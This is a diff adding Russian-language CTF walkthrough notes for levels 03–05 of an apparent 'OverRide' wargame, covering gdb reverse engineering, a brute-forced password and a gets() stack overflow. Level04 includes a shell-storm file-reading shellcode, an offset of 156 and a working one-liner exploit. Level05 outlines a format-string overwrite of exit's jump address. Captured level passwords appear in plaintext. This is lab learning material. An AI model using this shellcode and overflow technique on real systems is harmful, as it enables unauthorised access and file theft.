@@ -117,8 +117,241 @@ Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
 
 lol it works
 
-
-
 ===========
 LEVEL03
 ===========
+
+На входе нас встречает бинарник, который опять просит пароль.
+посмотрев cat ./level03 мы видим, что вызывается bin/sh после того, как вводим правильный пароль:
+���[�%uCongratulations!/bin/sh
+
+gdb info function указывает нам на наличие данных функций:
+
+0x080485d0  frame_dummy
+0x080485f4  clear_stdin
+0x08048617  get_unum
+0x0804864f  prog_timeout
+0x08048660  decrypt
+0x08048747  test
+
+
+disas main говорит о том, что мы сначала принтим 
+
+$ ./level03             			  0x08048880 <+38>:	movl   $0x8048a48,(%esp)
+***********************************		  0x08048887 <+45>:	call   0x80484d0 <puts@plt>   
+*		level03		**		  0x0804888c <+50>:	movl   $0x8048a6c,(%esp)
+***********************************		  0x08048893 <+57>:	call   0x80484d0 <puts@plt>
+						  0x08048898 <+62>:	movl   $0x8048a48,(%esp)
+						  0x0804889f <+69>:	call   0x80484d0 <puts@plt>
+
+Потом после просьбы ввода пароля вызывается функция test:
+   0x080488d5 <+123>:	call   0x8048747 <test>
+   c аргументами пароля и каким-то странным значением:
+      0x080488ca <+112>:	movl   $0x1337d00d,0x4(%esp)
+
+
+   0x08048748 <+1>:	mov    %esp,%ebp        
+   0x0804874a <+3>:	sub    $0x28,%esp		
+   0x0804874d <+6>:	mov    0x8(%ebp),%eax
+   0x08048750 <+9>:	mov    0xc(%ebp),%edx
+   0x08048753 <+12>:	mov    %edx,%ecx
+   0x08048755 <+14>:	sub    %eax,%ecx 	value = password - 0x1337d00d
+   0x08048757 <+16>:	mov    %ecx,%eax
+   0x08048759 <+18>:	mov    %eax,-0xc(%ebp)
+   0x0804875c <+21>:	cmpl   $0x15,-0xc(%ebp) if (value > 0x15) о чем нам говорит, что ИТОГОВЫЙ пароль <= 0x15
+   0x08048760 <+25>:	ja     0x804884a <test+259> then
+   0x0804884a <+259>:	call   0x8048520 <rand@plt>
+   0x0804884f <+264>:	mov    %eax,(%esp)
+   0x08048852 <+267>:	call   0x8048660 <decrypt> decrypt(rand)
+
+   иначе мы делаем побитовый сдвиг влево и добавляем странное число 0x80489f0
+   0x08048766 <+31>:	mov    -0xc(%ebp),%eax 
+   0x08048769 <+34>:	shl    $0x2,%eax.      value = value << 2
+   0x0804876c <+37>:	add    $0x80489f0,%eax value += 0x80489f0
+   0x08048771 <+42>:	mov    (%eax),%eax     
+	
+   Далее идет какой-то странный вызов ряда decrypt
+   0x08048790 <+73>:	jmp    0x8048858 <test+273>
+   0x08048795 <+78>:	mov    -0xc(%ebp),%eax
+   0x08048798 <+81>:	mov    %eax,(%esp)
+   0x0804879b <+84>:	call   0x8048660 <decrypt>
+   0x080487a0 <+89>:	jmp    0x8048858 <test+273>
+   0x080487a5 <+94>:	mov    -0xc(%ebp),%eax
+   0x080487a8 <+97>:	mov    %eax,(%esp)
+   0x080487ab <+100>:	call   0x8048660 <decrypt>
+   0x080487b0 <+105>:	jmp    0x8048858 <test+273>
+   0x080487b5 <+110>:	mov    -0xc(%ebp),%eax
+   0x080487b8 <+113>:	mov    %eax,(%esp)
+
+Вообще, выглядит так, как будто наш пароль находится в рендже 0x1337d00d - 0x15. Т.к тест вызывается с аргументами password, 0x1337d00d. Далее идет вычитание из password числа 0x1337d00d и если оно в рендже 0x15, то идем в декрипт. Кажется можно попробовать забрутфорсить пароль. Т.е брать за основу пароль 0x1337d00d, далее отнимать от 0x0 до 0x15. Попробуем посмотреть к чему это приведет
+0x1337d00d - 322424845
+0x15 - 21
+
+путем долгого перебора пришли к паролю:
+322424827
+
+$ cat /home/users/level04/.pass
+kgv3tkEb9h2mLkRsPkXRfc2mHbjMxQzvb2FrgKkf
+
+===========
+LEVEL04
+===========
+
+катнув левел, мы видим мем:
+[�%uGive me some shellcode, kchild is exiting...no exec() for you;P	L��
+
+Походу тут опять какой-нибудь gets для которого нужен shellcode
+ltrace собственно подтверждает 
+level04@OverRide:~$ ltrace ./level04
+__libc_start_main(0x80486c8, 1, -10348, 0x8048830, 0x80488a0 <unfinished ...>
+signal(14, 0x0804868f)                                                   = NULL
+alarm(60)                                                                = 0
+fork(Give me some shellcode, k
+)                                                                   = 2120
+wait(0xf
+
+info functions:
+0x080484a0  fflush
+0x080484a0  fflush@plt
+0x080484b0  gets 			как я и говорил
+0x080484b0  gets@plt
+0x080484c0  getchar
+0x080484c0  getchar@plt
+0x080484d0  signal
+0x080484d0  signal@plt
+0x080484e0  alarm
+0x080484e0  alarm@plt
+0x080484f0  wait
+0x080484f0  wait@plt
+0x08048500  puts
+0x08048500  puts@plt
+
+Но есть какой-то страшный fork
+
+   0x080486d6 <+14>:	call   0x8048550 <fork@plt> -- форкаемся
+   0x080486db <+19>:	mov    %eax,0xac(%esp)
+   0x080486e2 <+26>:	lea    0x20(%esp),%ebx
+   0x080486e6 <+30>:	mov    $0x0,%eax
+   0x080486eb <+35>:	mov    $0x20,%edx
+   0x080486f0 <+40>:	mov    %ebx,%edi
+   0x080486f2 <+42>:	mov    %edx,%ecx
+   0x080486f4 <+44>:	rep stos %eax,%es:(%edi)
+   0x080486f6 <+46>:	movl   $0x0,0xa8(%esp)
+   0x08048701 <+57>:	movl   $0x0,0x1c(%esp)
+   0x08048709 <+65>:	cmpl   $0x0,0xac(%esp) смотрим что мы - чайлд (obj = fork; if obj == 0 then we are child)
+   0x08048711 <+73>:	jne    0x8048769 <main+161> и если мы чайлд то
+   0x0804875e <+150>:	call   0x80484b0 <gets@plt> по итогу проваливаемся в гетс который мы должны хАкнуть
+
+Т.е мы за раз(родителем) должны провалится в gets и вставить туда shellcode. так же мы должны найти offset. Ищем через https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/
+ю.д
+
+ltrace -f позволяет нам отслеживать дочерний процесс
+
+оффсет в 100 нам ничего не дал, пробуем в 200
+
+level04@OverRide:~$ ltrace -f ./level04
+[pid 2257] __libc_start_main(0x80486c8, 1, -10348, 0x8048830, 0x80488a0 <unfinished ...>
+[pid 2257] signal(14, 0x0804868f)                                        = NULL
+[pid 2257] alarm(60)                                                     = 0
+[pid 2257] fork()                                                        = 2258
+[pid 2257] wait(0xffffd65c <unfinished ...>
+[pid 2258] <... fork resumed> )                                          = 0
+[pid 2258] prctl(1, 1, 0, 0xf7e2fe44, 2944)                              = 0
+[pid 2258] ptrace(0, 0, 0, 0, 2944)                                      = -1
+[pid 2258] puts("Give me some shellcode, k"Give me some shellcode, k
+)                             = 26
+[pid 2258] gets(-10656, 0, 0, 0, 2944Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+)                                   = -10656
+[pid 2258] --- SIGSEGV (Segmentation fault) ---
+[pid 2258] +++ killed by SIGSEGV +++
+[pid 2257] --- SIGCHLD (Child exited) ---
+[pid 2257] <... wait resumed> )                                          = 2258
+[pid 2257] puts("child is exiting..."child is exiting...
+)                                   = 20
+[pid 2257] +++ exited (status 0) +++
+level04@OverRide:~$
+
+EIP не дал :( . Тогда идем в gdb
+set follow-fork-mode child - позесимся в child.
+
+(gdb) r
+Starting program: /home/users/level04/level04
+[New process 2265]
+Give me some shellcode, k
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+
+Program received signal SIGSEGV, Segmentation fault.
+[Switching to process 2265]
+0x41326641 in ?? () - EIP :)
+
+Вставив его в генератор получим оффсет: 
+156
+
+далее находим shellcode to open bin/sh. Но есть проблема, используется ptrace родителем, который запрещает execute дочернему процессу.
+Поэтому нам нужно не вызывать execute, а читать: http://shell-storm.org/shellcode/files/shellcode-73.php
+"\x31\xc0\x31\xdb\x31\xc9\x31\xd2"
+"\xeb\x32\x5b\xb0\x05\x31\xc9\xcd"
+"\x80\x89\xc6\xeb\x06\xb0\x01\x31"
+"\xdb\xcd\x80\x89\xf3\xb0\x03\x83"
+"\xec\x01\x8d\x0c\x24\xb2\x01\xcd"
+"\x80\x31\xdb\x39\xc3\x74\xe6\xb0"
+"\x04\xb3\x01\xb2\x01\xcd\x80\x83"
+"\xc4\x01\xeb\xdf\xe8\xc9\xff\xff"
+"\xff"
+"/etc/passwd"; //Put here the file path, default is /etc/passwd
+
+export SHELLCODE=$'\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level05/.pass'
+
+megahuxks.c:
+#include <stdio.h>
+#include <stdlib.h>
+
+int main()
+{
+	printf("%p\n", getenv("SHELLCODE"));
+}
+
+если скомпилим по дефолту, то будет компилить в x64, но адрес его нам не подходит, по этому компилим 32 
+level04@OverRide:/tmp$ gcc -m32 megahuxks.c
+level04@OverRide:/tmp$ ./a.out
+0xffffd881
+
+
+По итогу эксплойт:
+
+offset + shellcodeaddr
+
+
+level04@OverRide:~$ python -c "print 156 * 'a' + '\x81\xd8\xff\xff'" | ./level04
+Give me some shellcode, k
+3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
+child is exiting...
+
+
+===========
+LEVEL05
+===========
+
+info functions дает нам такой рассклад:
+0x08048340  printf
+0x08048350  fgets
+0x08048370  exit
+0x08048420  frame_dummy
+0x08048444  main
+
+
+so we need shellcode coz this shit aint using no syscall with bin sh
+we have printf which can be fucked with and we have exit after printf, whose *jmp addr we can reroute to shellcode addr
+
+disas exit gives this addr: 
+jmp    *0x80497e0
+
+buff addr (???)
+0x080497e8  data_start
+
+
+read this:
+https://github.com/anyaschukin/OverRide/blob/main/level05/README.md
+
+
+
